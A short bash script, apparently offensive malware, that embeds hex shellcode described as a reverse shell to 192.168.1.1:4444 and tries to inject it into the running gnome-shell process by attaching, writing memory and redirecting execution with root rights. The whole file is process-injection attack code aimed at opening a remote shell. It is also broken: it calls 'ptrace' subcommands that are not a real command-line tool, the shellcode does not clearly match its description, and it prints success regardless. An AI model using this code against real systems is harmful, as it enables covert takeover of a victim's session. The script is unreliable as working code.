#!/bin/bash

# Define shellcode for a reverse shell (in raw hex format)
# For example, this is a simple reverse shell to IP 192.168.1.1 on port 4444
shellcode="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb0\x66\x43\x51\x53\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x89\xc3\x50\x50\x49\x89\xe1\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x43\x89\xc3\x50\x50\x89\xe1\xb0\x66\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

# Function to find the process ID of a specific process (e.g., "gnome-shell")
find_process_id() {
  pid=$(pgrep -x "$1")
  echo "$pid"
}

# Function to inject shellcode into the process
inject_shellcode() {
  local pid=$1
  local shellcode=$2

  # Use ptrace to attach to the process (must have root permissions)
  sudo ptrace attach "$pid"

  # Allocate memory in the target process using ptrace
  local mem_addr=$(sudo ptrace allocate "$pid" "${#shellcode}")
  
  # Write the shellcode into the allocated memory
  sudo ptrace write "$pid" "$mem_addr" "$shellcode"

  # Change the program counter (PC) or instruction pointer to the shellcode address
  sudo ptrace set_registers "$pid" pc "$mem_addr"

  # Resume the process execution
  sudo ptrace detach "$pid"
}

# Main logic
process_name="gnome-shell"  # Change this to the name of the target process
pid=$(find_process_id "$process_name")

if [ -z "$pid" ]; then
  echo "Process not found."
  exit 1
fi

echo "Injecting shellcode into process $process_name (PID: $pid)..."
inject_shellcode "$pid" "$shellcode"

echo "Shellcode injected successfully."

